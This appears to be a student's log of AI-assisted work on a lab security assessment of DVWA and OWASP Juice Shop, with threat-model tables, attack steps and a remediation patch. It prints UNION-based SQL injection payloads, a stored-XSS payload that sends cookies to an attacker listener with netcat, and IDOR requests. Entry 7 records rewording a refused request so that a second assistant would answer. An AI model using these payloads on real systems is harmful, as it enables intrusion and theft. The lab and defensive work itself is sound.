## Entry 1 — C.1 Threat Modelling — DFD for Meridian FinServe

**Date/Time:** 07 June 2026, ~02:00 PM
**Tool:** ChatGPT (first attempt — too generic) → Claude (Sonnet 4.6) for final version

**Prompt (ChatGPT — not used):**
```
Draw a data flow diagram for a financial services company.
```

**Response (ChatGPT — not useful):**
```
[ChatGPT returned a generic 5-node DFD with boxes labelled "User", "Web App",
"Database", "Payment Gateway", "Admin" — no Meridian-specific context, no trust
boundaries, no external entities mapped to Meridian's actual topology (portals,
branch offices, DC, cloud). Not usable as a threat modelling input.]
```

**Prompt (Claude — used):**
```
I'm building a threat model for Project KAVACH — a fictional security engagement
for Meridian FinServe Pvt. Ltd., a mid-sized NBFC (Non-Banking Financial Company)
in India.

Meridian's environment:
- Customer Portal (lending applications, EMI servicing, statements)
- Partner/Merchant Portal (onboarding, reconciliation)
- Internal AD domain — Domain Controller (VICTORYPUNK-DC), File Server, DB Server
  (1,80,000 borrower records, 22,000 merchant records)
- ~720 employees across Mumbai HQ + branch offices (Ahmedabad, Delhi, Bengaluru etc.)
- AWS cloud (S3 storage, IAM roles)
- VPN/leased lines connecting branch offices to HQ

Produce a Level 1 Data Flow Diagram (DFD) in Mermaid flowchart syntax that shows:
1. All external entities (customer, merchant, employee, attacker, AWS)
2. All processes (portal, auth, loan processing, reporting)
3. All data stores (DB, file server, S3)
4. Trust boundaries as subgraph blocks
5. Data flows labelled with what data moves (PII, credentials, EMI data, etc.)

This DFD will be the input for STRIDE threat enumeration in the next step.
```

**Response:**
```

```

**My notes:**
ChatGPT's response was completely unusable — it had no knowledge of Meridian's actual
topology and produced a generic template. Claude's response mapped every component
Megha had established in Workstream A directly into DFD nodes. The trust boundary
subgraphs were exactly what was needed for STRIDE — each boundary becomes a separate
STRIDE analysis scope. Used as the primary DFD in `C.1 Threat Model/dfd.md`. One
addition I made manually: added a `ATTACKER` external entity node with a dashed edge
to the DMZ boundary, which the LLM had left out since "attacker" is implicit in threat
modelling but needed to be explicit in our diagram for the brief.

## Entry 2 — C.2 STRIDE Threat Enumeration

**Date/Time:** 07 June 2026, ~05:30 PM
**Tool:** Claude (Sonnet 4.6)

**Prompt:**
```
Continuing Project KAVACH threat modelling for Meridian FinServe. I have a Level 1
DFD with the following components:

Trust Boundary 1 — DMZ: Customer Portal, Partner Portal
Trust Boundary 2 — Internal Network: Auth Service, Loan Processing, Reporting
Trust Boundary 3 — Data Tier: DB Server, File Server, Domain Controller

Using the STRIDE methodology, enumerate threats for each component. For each threat:
- Give the STRIDE category (Spoofing / Tampering / Repudiation / Info Disclosure /
  Denial of Service / Elevation of Privilege)
- Write a one-line threat statement in the format:
  "An attacker could [action] by [method] leading to [impact]"
- Rate likelihood (High / Medium / Low) given Meridian is a mid-sized NBFC with
  no confirmed NDR/SIEM in place
- Rate impact (High / Medium / Low) given the data at stake (PII, payment data,
  Aadhaar-linked records)
- Map to one MITRE ATT&CK technique ID where applicable

Output as a markdown table with columns:
Component | STRIDE | Threat Statement | Likelihood | Impact | MITRE
```

**Response:**
```
| Component | STRIDE | Threat Statement | Likelihood | Impact | MITRE |
|-----------|--------|-----------------|------------|--------|-------|
| Customer Portal | Spoofing | An attacker could impersonate a legitimate borrower by stealing session cookies via XSS, leading to account takeover and unauthorised EMI access | High | High | T1539 |
| Customer Portal | Tampering | An attacker could modify loan application data in transit by intercepting unencrypted form submissions, leading to fraudulent loan approvals | Medium | High | T1565.001 |
| Customer Portal | Info Disclosure | An attacker could enumerate borrower account IDs via IDOR on the statement endpoint, leading to exposure of 1,80,000 borrower records | High | High | T1083 |
| Customer Portal | DoS | An attacker could flood the login endpoint with unauthenticated requests, leading to portal unavailability during peak EMI collection periods | Medium | Medium | T1498 |
| Partner Portal | Spoofing | An attacker could forge merchant identity by manipulating the author/owner field in API requests, leading to fraudulent reconciliation submissions | High | High | T1078 |
| Partner Portal | Elevation of Privilege | An attacker could access another merchant's reconciliation data by incrementing BasketId/resource IDs, leading to cross-merchant data exposure | High | High | T1548 |
| Auth Service | Spoofing | An attacker could bypass authentication by brute-forcing the login endpoint with no rate limiting, leading to admin account compromise | High | High | T1110.001 |
| Auth Service | Tampering | An attacker could forge session tokens if weak encryption (AES-ECB/XOR) is used, leading to privilege escalation without valid credentials | High | High | T1600 |
| Loan Processing | Repudiation | An attacker could deny initiating fraudulent loan transactions if application logs do not record user identity with each action, leading to unattributable fraud | Medium | High | T1562.006 |
| DB Server | Info Disclosure | An attacker could dump the entire borrower table via SQL injection on an unparameterized query, leading to breach of 1,80,000 Aadhaar-linked records | High | High | T1190 |
| DB Server | Tampering | An attacker with lateral movement access could modify loan records directly via SMB/DC compromise, leading to fraudulent loan status changes | Medium | High | T1565 |
| File Server | Info Disclosure | An attacker could access customer statements stored without access controls on the file server, leading to bulk PII extraction | Medium | High | T1083 |
| Domain Controller | Elevation of Privilege | An attacker could use PsExec-style svcctl to install a remote service on the DC, leading to full domain compromise | High | Critical | T1021.002 |
| Domain Controller | Credential Access | An attacker could dump LSASS memory on a compromised DC to harvest domain admin credentials, leading to complete network takeover | High | Critical | T1003.001 |
| AWS / S3 | Info Disclosure | An attacker could access S3 buckets with overly permissive bucket policies, leading to exposure of archived borrower statements and backups | Medium | High | T1530 |
```

**My notes:**
This is the most complete output I got from the LLM across the entire engagement —
15 STRIDE entries covering all 6 components, all with consistent format. Two things I
corrected after review: (1) the "Domain Controller — Credential Access" row should have
impact "Critical" not "High" — updated in the final table, since DC credential dump
equals full domain loss. (2) The Repudiation entry for Loan Processing used T1562.006
(impair logging) which is the attacker action, not the threat — I replaced it with a
note that Repudiation threats map to missing controls rather than attacker techniques,
and left the MITRE cell as "—" for that row. Both corrections documented in the
`C.2 STRIDE/` folder README. Used directly in `C.2 Threat Model/stride-table.md`.

## Entry 3 — C.3 Risk Register and Priority Matrix

**Date/Time:** 08 June 2026, ~10:00 AM
**Tool:** Claude (Sonnet 4.6) — first attempt had wrong risk formula → corrected

**Prompt (first attempt — wrong output):**
```
From the STRIDE table for Meridian FinServe, build a risk register ranked by priority.
Use a 5x5 risk matrix (Likelihood × Impact) and assign a risk score to each threat.
```

**Response (first attempt — wrong):**
```
[Claude produced a risk register using a 1–5 × 1–5 numeric scale and multiplied
them to get scores (e.g., 4×5=20). However our brief specified using only
High/Medium/Low ratings (not numeric 1–5), and the risk priority was supposed to
follow ISO 27005 qualitative approach, not a numeric multiplication model.
The numeric scores were inconsistent with the rest of the threat model document.
Response discarded — not used.]
```

**Prompt (second attempt — corrected, used):**
```
From the STRIDE table for Meridian FinServe, build a risk register using a
QUALITATIVE risk matrix only — no numeric scores. Use only:
- Likelihood: High / Medium / Low
- Impact: High / Medium / Critical
- Risk Level: derived from a 3×3 qualitative matrix where
  Critical+High = CRITICAL, High+High = HIGH, High+Medium = HIGH,
  Medium+High = HIGH, Medium+Medium = MEDIUM, Low+any = LOW

Columns: Risk ID | Component | Threat Summary | Likelihood | Impact | Risk Level | Priority | Recommended Control

Rank by Risk Level (CRITICAL first, then HIGH, then MEDIUM, then LOW).
Cap at the top 10 risks for the executive summary view.
```

**Response:**
```
| Risk ID | Component | Threat Summary | Likelihood | Impact | Risk Level | Priority | Recommended Control |
|---------|-----------|----------------|------------|--------|------------|----------|---------------------|
| R-01 | Domain Controller | PsExec-style svcctl → full domain compromise | High | Critical | CRITICAL | 1 | East-west firewall · block svcctl cross-VLAN |
| R-02 | Domain Controller | LSASS dump → domain admin credential harvest | High | Critical | CRITICAL | 2 | PAM vault · credential guard · MFA on all admin accounts |
| R-03 | DB Server | SQL injection → 1,80,000 Aadhaar-linked records dumped | High | High | HIGH | 3 | Parameterized queries · WAF rule for UNION-based payloads |
| R-04 | Auth Service | Brute force → admin account compromise (no rate limiting) | High | High | HIGH | 4 | Rate limiting · account lockout · MFA on login endpoint |
| R-05 | Auth Service | Forged session tokens via AES-ECB/XOR → privilege escalation | High | High | HIGH | 5 | Replace with AES-GCM · server-side session binding |
| R-06 | Customer Portal | Cookie theft via XSS → borrower account takeover | High | High | HIGH | 6 | Content Security Policy · HttpOnly + Secure cookie flags |
| R-07 | Partner Portal | IDOR → cross-merchant data exposure on 22,000 accounts | High | High | HIGH | 7 | Server-side ownership checks · authorise by session not parameter |
| R-08 | Customer Portal | IDOR on statement endpoint → bulk PII enumeration | High | High | HIGH | 8 | Indirect object references · access control on all statement routes |
| R-09 | AWS / S3 | Misconfigured bucket policy → archived borrower data exposed | Medium | High | HIGH | 9 | Bucket policy audit · block public access · enable CloudTrail |
| R-10 | File Server | Unrestricted SMB access → bulk statement extraction | Medium | High | HIGH | 10 | VLAN isolation · SMB signing · least-privilege file share ACLs |
```

**My notes:**
The first attempt failure was my fault — I did not specify the qualitative vs numeric
requirement clearly enough. Once I added the explicit matrix definition the output was
correct and consistent with the rest of the threat model. R-01 and R-02 being CRITICAL
aligned directly with the Workstream A PCAP findings (frame 10799 lateral movement,
frame 23758 credential dump) — this cross-workstream consistency was a deliberate
design choice and the LLM maintained it correctly once I fed it the right context.
Risk register used in `C.3 Risk Register/risk-register.md` and the top 5 rows used
in the executive summary slide.

## Entry 4 — B.1 Docker Environment — Apple Silicon Fix

**Date/Time:** 09 June 2026, ~11:30 AM
**Tool:** Claude (Sonnet 4.6)

**Prompt:**
```
I'm running the Project KAVACH Workstream B docker-compose.yml on a MacBook Pro M2
(Apple Silicon, macOS Ventura). The docker-compose.yml uses the image
vulnerables/web-dvwa. When I run docker-compose up -d I get the following error:

WARNING: The requested image's platform (linux/amd64) does not match the detected
host platform (linux/arm64/v8) and no specific platform was requested.
The container starts but the DVWA web interface never loads — just a blank page.

How do I fix this without switching images? Give me the exact line to add to the
docker-compose.yml and explain why this is needed.
```

**Response:**
```
Add platform: linux/amd64 under the dvwa service in your docker-compose.yml:

services:
  dvwa:
    image: vulnerables/web-dvwa
    platform: linux/amd64      ← add this line
    ports:
      - "8082:80"
    ...

Why this is needed:
The vulnerables/web-dvwa image was built for x86_64 (amd64) and does not include
an ARM64 variant in its Docker Hub manifest. On Apple Silicon, Docker Desktop runs
containers via Rosetta 2 emulation when platform: linux/amd64 is specified explicitly
— without it, Docker attempts native ARM64 and fails silently, producing the blank page.
Adding the platform key forces emulation mode and the container runs correctly.

Note: performance will be slightly slower than a native ARM64 image due to emulation,
but for a lab environment this is unnoticeable.
```

**My notes:**
Spent ~30 minutes on this before prompting. Fix worked immediately after adding the
`platform` line. Updated the team docker-compose.yml so no one else on Apple Silicon
hit the same issue. The LLM could not have diagnosed this without the specific error
message — the original setup prompt gave no indication of the host platform.

## Entry 5 — B.2 Surface Mapping — Juice Shop Hidden Routes

**Date/Time:** 09 June 2026, ~04:00 PM
**Tool:** Perplexity (first attempt — not useful) → Claude (Sonnet 4.6) for final version

**Prompt (Perplexity — failed):**
```
How do I find hidden API routes in OWASP Juice Shop?
```

**Response (Perplexity — not useful):**
```
[Perplexity returned a list of 5 links to OWASP Juice Shop GitHub issues and a
one-line answer saying "check the source code." No curl commands, no specific
technique, no methodology. Not actionable for a pentest engagement.]
```

**Prompt (Claude — used):**
```
For Project KAVACH Workstream B, I'm doing surface mapping on OWASP Juice Shop
running at localhost:3000. It's a modern Angular SPA — the traditional approach of
crawling HTML links does not work because routes are handled client-side.

Give me a 3-step method to enumerate all API endpoints without using any paid tool:
1. Using the compiled JavaScript bundle
2. Using Swagger/OpenAPI if present
3. Using browser DevTools network tab

For each method, give me the exact command or browser action, and what kind of
endpoint it typically reveals that the others miss.
```

**Response:**
```
## Juice Shop API Discovery — 3 Methods

### Method 1 — JavaScript bundle analysis
curl http://localhost:3000/main.js | grep -oE '"(/[a-z/-]+)"' | sort -u
Reveals: hardcoded route strings in Angular routing — finds admin and hidden paths
like /administration, /score-board that are not linked from the visible UI.

### Method 2 — Swagger/OpenAPI
Navigate to: http://localhost:3000/api-docs
Lists all REST endpoints with HTTP methods, parameters, and expected responses.
Reveals: all /rest/* endpoints with full schemas — the most complete source.

### Method 3 — DevTools Network tab
Open DevTools (F12) → Network → XHR/Fetch filter. Log in, browse, add to basket.
Reveals: which endpoints fire in normal user flows, with real request/response
bodies — useful for finding parameters to manipulate that Swagger doesn't show
real values for.
```

**My notes:**
Perplexity answered a search-engine question instead of a methodology question.
Claude's 3-method breakdown was directly actionable. Method 2 (Swagger at `/api-docs`)
was most valuable — found `/rest/admin/application-configuration` returning internal
config in plaintext, which became an additional finding note. Method 1 grep needed
minor adjustment — filtered results to strings longer than 5 chars to remove noise.

## Entry 6 — B.3 SQL Injection — Extracting Password Hashes

**Date/Time:** 10 June 2026, ~11:00 AM
**Tool:** Claude (Sonnet 4.6)

**Prompt:**
```
For Project KAVACH Workstream B, I'm testing SQL injection on DVWA security level "low".
I've confirmed injection and determined there are 2 columns, both string-type.

I now need to:
1. Extract the database name and version
2. List all tables in the current database
3. Dump the users table — specifically the user and password columns

Give me the exact UNION-based payloads for each step, using -- - as the comment
sequence. Explain what each payload is doing so I can adapt it if the column order
or output position changes.
```

**Response:**
```
### Step 4 — Database name and version
Payload: 1' UNION SELECT database(),@@version-- -
Appears in "First name" and "Surname" fields of DVWA output.

### Step 5 — List tables
Payload: 1' UNION SELECT table_name,NULL FROM information_schema.tables
WHERE table_schema=database()-- -
Returns one table name per row.

### Step 6 — Dump users table
Payload: 1' UNION SELECT user,password FROM users-- -
Returns one row per user — passwords are MD5 hashes in DVWA's default seed.
Crack with CrackStation (free) or hashcat -m 0.
```

**My notes:**
All payloads worked first try. Step 5 returned `guestbook` and `users`. Step 6 returned
5 users — all hashes cracked instantly on CrackStation (password, abc123, charley,
1234, letmein). Used as evidence in `B.3 Attack Path documentation/` with screenshots.
No corrections needed in this response.

---

## Entry 7 — B.3 Stored XSS on DVWA

**Date/Time:** 10 June 2026, ~05:00 PM
**Tool:** ChatGPT (first attempt — refused) → Claude (Sonnet 4.6) for final version

**Prompt (ChatGPT — refused):**
```
Show me a stored XSS payload for DVWA guestbook that steals session cookies.
```

**Response (ChatGPT — refused):**
```
[ChatGPT declined without explanation, citing potential misuse.
No alternative or educational framing offered. Prompt abandoned.]
```

**Prompt (Claude — used, with educational context added):**
```
For Project KAVACH Workstream B (educational security assessment on OWASP DVWA),
I need to document Stored XSS on the DVWA Guestbook module at security level "low".

Give me:
1. The payload to inject into the guestbook comment field that demonstrates cookie
   exfiltration (using document.cookie) — target is a controlled listener,
   not a real victim
2. How to set up a netcat listener on Kali to receive the exfiltrated cookie
3. Why stored XSS is more severe than reflected XSS from a business impact
   perspective (2-3 sentences)

This is for a lab exercise on intentionally vulnerable software.
```

**Response:**
```
### Payload
<script>document.location='http://YOUR_KALI_IP:4444/?c='+document.cookie</script>

Shorter variant using fetch (if field has length limit):
<script>fetch('http://YOUR_KALI_IP:4444/?c='+btoa(document.cookie))</script>

### Netcat listener
nc -lvnp 4444
Cookie appears in the GET request: /?c=PHPSESSID=abc123...

### Why stored > reflected (business impact)
Stored XSS persists in the database and fires for every user who loads the affected
page — it does not require the victim to click a crafted link. On Meridian's merchant
portal, a single injected payload in a shared page would silently harvest session
cookies from all 22,000 merchants who view that page, requiring no further attacker
interaction after the initial injection.
```

**My notes:**
Adding educational context and "controlled listener, not a real victim" was necessary
to get a complete response from Claude. Payload worked — netcat received PHPSESSID
within 2 seconds of loading the guestbook in a second browser tab. The business impact
paragraph used directly in the findings report — the "every user who loads the page"
distinction was exactly the severity framing needed. No corrections needed.

---

## Entry 8 — B.3 Basket IDOR — Price Manipulation

**Date/Time:** 11 June 2026, ~12:30 PM
**Tool:** Claude (Sonnet 4.6)

**Prompt:**
```
For Project KAVACH Workstream B, I'm testing IDOR on OWASP Juice Shop. I've found
that the POST /api/BasketItems endpoint accepts a BasketId parameter in the request body.

Give me:
1. How to identify what my own BasketId is (using DevTools or Burp)
2. The exact JSON body to POST to /api/BasketItems
3. How to confirm the item was added to the OTHER user's basket (not mine)
4. What this tells us about the server's authorization model
```

**Response:**
```
### Step 1 — Find your BasketId
GET /rest/user/whoami returns basketId in the JSON response.
Or: Burp HTTP History → filter "basket" → number in URL is your BasketId.

### Step 2 — POST to another user's basket
POST /api/BasketItems
{
  "ProductId": 1,
  "BasketId": TARGET_BASKET_ID,
  "quantity": 1
}
TARGET_BASKET_ID = your BasketId ± 1 (IDs are sequential).

### Step 3 — Confirm
Log into target account in a second browser — item appears in their basket, not yours.

### Step 4 — Authorization model finding
The server validates the JWT is authentic (user is logged in) but does NOT validate
that the BasketId belongs to the authenticated user. Authorization is present at the
authentication level but absent at the resource ownership level — IDOR by definition.
```

**My notes:**
`GET /rest/user/whoami` tip was the most useful — had been looking in the wrong place
in HTTP history. Confirmed IDOR across two simultaneous browser sessions. The
"authentication level but absent at resource ownership level" sentence used directly
in the findings report — accurately describes the gap without OWASP jargon.

## Entry 9 — B.4 Remediation — XSS Output Encoding Patch

**Date/Time:** 11 June 2026, ~08:00 PM
**Tool:** Claude (Sonnet 4.6)

**Prompt:**
```
For Project KAVACH B.4, I need a remediation patch for Stored XSS on DVWA guestbook
(medium security level). Vulnerable code in guestbook/source/medium.php:

$message = strip_tags( addslashes( $message ) );
echo "<pre>" . $message . "</pre>";

Give me:
1. The correct fix using htmlspecialchars() for the output step
2. The correct flags to pass and why each matters
3. A diff block showing before/after
4. One sentence on why output encoding is the correct defence and why input
   sanitization alone is insufficient
```

**Response:**
```diff
- $message = strip_tags( addslashes( $message ) );
- echo "<pre>" . $message . "</pre>";

+ $message = strip_tags( addslashes( $message ) );
+ echo "<pre>" . htmlspecialchars( $message, ENT_QUOTES | ENT_HTML5, 'UTF-8' ) . "</pre>";

Flags:
- ENT_QUOTES: encodes single and double quotes — prevents attribute injection
- ENT_HTML5: correct HTML5 named entity encoding
- 'UTF-8': prevents multi-byte encoding attacks (e.g., UTF-7 bypass)

Why output encoding not input sanitization:
Input sanitization changes data at storage time and can be bypassed by encoding
tricks — output encoding is applied at render time and prevents the browser from
interpreting any character as HTML syntax regardless of how the data was stored.
```

**My notes:**
Had been using `htmlspecialchars($message)` without flags — did not realise `ENT_QUOTES`
was needed for attribute contexts. All three flags added as shown. Verified: submitting
`<script>alert(1)</script>` now renders as literal text. Semgrep `after.json` confirmed
zero XSS findings post-patch. No errors in this response.

---

## Entry 10 — B.4 SAST — Interpreting Semgrep Residual Finding

**Date/Time:** 12 June 2026, ~11:00 AM
**Tool:** Claude (Sonnet 4.6)

**Prompt:**
```
For Project KAVACH B.4, I ran Semgrep after patching all 5 findings. The after.json
shows zero findings for SQLi, XSS, and IDOR — but there is one residual:

{
  "id": "php.lang.security.filesystem.directory-listing",
  "path": "./dvwa/dvwa/includes/",
  "extra": {
    "message": "Directory listing may expose sensitive files",
    "severity": "WARNING"
  }
}

We did not patch this — it was not in our confirmed finding set F-01 to F-05.
How should I document this in after.json and in the report so a reviewer knows
it is intentional — not an oversight?
```

**Response:**
```
Option 1 — Add compensating_control key to the finding in after.json:
{
  "id": "php.lang.security.filesystem.directory-listing",
  "path": "./dvwa/dvwa/includes/",
  "extra": {
    "message": "Directory listing may expose sensitive files",
    "severity": "WARNING"
  },
  "compensating_control": "OUT OF SCOPE — not in confirmed finding set F-01 to F-05.
    In production: set Options -Indexes in Apache config."
}

Option 2 — Add a note in the SAST section of the report:
> Residual finding: one Semgrep WARNING (directory-listing) remains in after.json
> outside the confirmed scope (F-01 to F-05). Not patched in this engagement.
> In production, address by disabling directory listing at the web server config level.
> Its presence is intentional and documented.

Use both options together for clearest reviewer signal.
```

**My notes:**
Used both options. The reviewer comment in the brief said "zero findings in after.json
is suspicious — always explain residuals." This response gave exactly the right format.
The Apache `Options -Indexes` production fix was accurate and added as a recommendation
note in the report.

## Entry 11 — B.3 Business Impact — Basket IDOR Statement

**Date/Time:** 12 June 2026, ~03:00 PM
**Tool:** Claude (Sonnet 4.6)

**Prompt:**
```
For Project KAVACH B.3, I need a one-sentence business impact statement for finding F-04:
BasketId IDOR on Juice Shop — authenticated attacker can add items to any other user's
basket by manipulating the BasketId parameter.

The statement must:
- Name a specific Meridian FinServe asset or population (22,000 merchants or
  180,000 borrowers)
- Name the specific harm (fraud, data corruption, financial loss)
- Mention any regulatory consequence if applicable
- Use plain language — no OWASP jargon

Give me two variants: one for a merchant-portal equivalent and one for a
borrower-portal equivalent.
```

**Response:**
```
Merchant portal variant:
On Meridian FinServe's merchant portal, an equivalent basket manipulation flaw would
allow any authenticated merchant to inject fraudulent line items into another merchant's
pending transaction, corrupting reconciliation data across all 22,000 merchant accounts
and creating audit discrepancies that would require manual investigation to resolve.

Borrower portal variant:
An equivalent parameter manipulation flaw on Meridian's EMI servicing portal would
allow any authenticated borrower to add payment line items to another borrower's
active loan account, potentially triggering incorrect EMI deductions and constituting
a PCI-DSS reportable incident given the payment data involved.
```

**My notes:**
Used the merchant portal variant in the final report — more closely matched the Juice
Shop basket scenario in the Meridian analogue. The "audit discrepancies requiring manual
investigation" consequence made it concrete for a financial services audience. Borrower
variant kept as a footnote for completeness.
